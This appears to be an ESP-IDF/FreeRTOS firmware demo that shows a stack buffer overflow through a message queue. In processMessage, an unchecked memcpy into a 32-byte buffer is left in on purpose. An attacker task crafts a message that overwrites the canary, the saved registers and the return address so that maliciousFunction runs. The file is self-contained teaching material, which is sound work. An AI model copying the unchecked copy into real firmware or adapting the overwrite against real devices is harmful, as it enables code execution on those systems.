#include "attack.h"
#include "esp_console.h"
#include "esp_err.h"
#include "esp_log.h"
#include "esp_system.h"
#include "freertos/FreeRTOS.h"
#include "freertos/queue.h"
#include "freertos/task.h"
#include <string.h>

static const char *TAG = "EXPLOIT_DEMO";

static QueueHandle_t xMessageQueue = NULL;

void maliciousFunction(void) {
  ESP_LOGE(TAG, "\n");
  ESP_LOGE(TAG, "========================================");
  ESP_LOGE(TAG, "    EXPLOIT SUCCESSFUL!");
  ESP_LOGE(TAG, "========================================");
  ESP_LOGE(TAG, "Queue-based attack succeeded!");
  ESP_LOGE(TAG, "Attacker gained code execution");
  ESP_LOGE(TAG, "========================================\n");

  vTaskDelay(pdMS_TO_TICKS(1000));
  ESP_LOGE(TAG, "Rebooting system...");
  esp_restart();
}

void processMessage(QueueMessage_t *msg) {
  char localBuffer[32];
  ESP_LOGI(TAG, "Processing message:");
  ESP_LOGI(TAG, "  Length: %lu bytes", msg->data_length);
  ESP_LOGI(TAG, "  Buffer: %p", localBuffer);

  // VULNERABILITY: No validation of msg->data_length!
  // Attacker can specify length > 32 to overflow localBuffer
  memcpy(localBuffer, msg->data, msg->data_length);

  // Process the data (dummy operation)
  ESP_LOGI(TAG, "Message processed: %.32s", localBuffer);
}

void vAttackerTask(void *pvParameters) {
  ESP_LOGE(TAG, "=== ATTACKER Task Started ===");

  /* ===== ATTACK 1: Normal message ===== */
  ESP_LOGI(TAG, "\n--- Attack 1: Sending normal message ---");
  {
    QueueMessage_t normalMsg = {.data_length = 14, .data = "Hello, world!"};
    normalMsg.data[13] = 0;

    xQueueSend(xMessageQueue, &normalMsg, portMAX_DELAY);
  }

  vTaskDelay(pdMS_TO_TICKS(2000));

  /* ===== ATTACK 2: exploit via queue ===== */
  ESP_LOGE(TAG, "\n--- Attack 2: Queue-based attack ---");
  {
    QueueMessage_t exploitMsg = {
        .data_length = 48, // Enough to overwrite return address
    };

    uint32_t *wordPtr = (uint32_t *)exploitMsg.data;

    // Fill buffer (32 bytes)
    for (int i = 0; i < 8; i++) {
      wordPtr[i] = i;
    }

    // Overwrite canary at offset 32
    wordPtr[8] = 0x1;

    // Saved s2 at offset 36
    wordPtr[9] = 0x1;

    // Saved s1 at offset 40
    wordPtr[10] = 0x1;

    // Saved s0/RA at offset 44
    wordPtr[11] = (uint32_t)maliciousFunction;

    xQueueSend(xMessageQueue, &exploitMsg, portMAX_DELAY);
  }

  // Wait to see results
  vTaskDelay(pdMS_TO_TICKS(5000));
  vTaskDelete(NULL);
}

/* Victim Task: Receives and processes messages */
void vVictimTask(void *pvParameters) {
  ESP_LOGI(TAG, "=== Victim Task Started ===");

  QueueMessage_t receivedMsg;

  for (;;) {
    // Wait for message from queue
    if (xQueueReceive(xMessageQueue, &receivedMsg, portMAX_DELAY) == pdTRUE) {
      ESP_LOGI(TAG, "Message received from queue");
      processMessage(&receivedMsg);
      ESP_LOGI(TAG, "Message processing complete");
    }
  }

  vTaskDelete(NULL);
}

int comp_attack_entry_func(int argc, char **argv) {
  // Create message queue
  xMessageQueue = xQueueCreate(5, sizeof(QueueMessage_t));
  if (xMessageQueue == NULL) {
    ESP_LOGE(TAG, "Failed to create queue!");
    vTaskDelete(NULL);
    return 0;
  }

  xTaskCreate(vVictimTask, "Victim", 4096, NULL, 5, NULL);
  vTaskDelay(pdMS_TO_TICKS(500));
  xTaskCreate(vAttackerTask, "Attacker", 4096, NULL, 5, NULL);
  vTaskDelete(NULL);
  return 0;
}

static void register_attack_example(void) {
  const esp_console_cmd_t attack_example_cmd = {
      .command = "attack",
      .help = "Run the example that demonstrates a security attack",
      .func = &comp_attack_entry_func};
  ESP_ERROR_CHECK(esp_console_cmd_register(&attack_example_cmd));
}

static void config_console(void) {
  esp_console_repl_t *repl = NULL;
  esp_console_repl_config_t repl_config = ESP_CONSOLE_REPL_CONFIG_DEFAULT();
  /* Prompt to be printed before each line.
   * This can be customized, made dynamic, etc.
   */
  repl_config.prompt = PROMPT_STR ">";
  repl_config.max_cmdline_length = 1024;
  esp_console_dev_uart_config_t uart_config =
      ESP_CONSOLE_DEV_UART_CONFIG_DEFAULT();
  ESP_ERROR_CHECK(esp_console_new_repl_uart(&uart_config, &repl_config, &repl));

  esp_console_register_help_command();

  // register entry functions for each component
  register_attack_example();

  ESP_ERROR_CHECK(esp_console_start_repl(repl));
  printf("\n"
         "Please type the component you would like to run.\n");
}

void app_main(void) { config_console(); }